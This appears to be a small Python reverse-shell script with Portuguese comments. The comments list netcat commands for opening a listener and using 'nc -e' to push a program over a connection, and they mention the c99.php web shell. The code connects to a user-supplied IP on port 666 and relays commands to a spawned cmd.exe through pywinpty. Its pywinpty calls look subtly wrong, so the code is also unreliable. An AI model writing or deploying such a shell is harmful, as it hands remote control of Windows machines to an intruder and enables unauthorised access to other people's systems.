#Abrir porta: nc -lvp porta
#conectar e enviar um programa através de conexão: nc -e "caminho" ip porta


#c99.php arquivo que permiter criar uma web shell em um servidor web apache. 
#Executar um processo base Windows
#import subprocess
#subprocess.run('cmd.exe')
import socket
import pywinpty

s = socket.socket()

ip = input('Informe o IP: ')

while True:
    try:
        s.connect((ip, 666))
    except Exception as e:
        print(f"Error connecting to {ip}: {str(e)}")
        exit()

    try:
        backend = pywinpty.winpty.Win32PtyBackend()
        pty = pywinpty.PtyProcessUnicode.spawn('cmd.exe', backend=backend)
        pty.setblocking(False)

        while True:
            try:
                data = s.recv(1024)
                if not data:
                    break
                pty.write(data)
                output = pty.read(1024)
                s.send(output)
            except socket.error:
                break
    except Exception as e:
        print(f"Error executing cmd.exe: {str(e)}")
        exit()
